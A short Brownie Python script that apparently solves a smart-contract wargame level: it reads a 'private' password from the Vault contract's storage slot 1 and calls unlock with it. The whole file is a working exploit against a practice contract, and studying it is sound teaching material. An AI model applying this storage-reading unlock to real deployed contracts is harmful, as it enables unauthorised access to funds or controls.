from brownie import web3, Vault, config, accounts, network

InstanceAddress = "0x59c5F8a490Fb748D3e36697D17Eb201a1a2db9aF"
player = accounts.add(config["wallets"]["from_key"]) 
def main():
    vault = Vault.at(InstanceAddress)
    password = web3.eth.get_storage_at(InstanceAddress, 1) #variable at [1] since [0] is the bool = locked
    
    print(f"Variable at slot[1]: {password}")

    vault.unlock(password, {"from": player})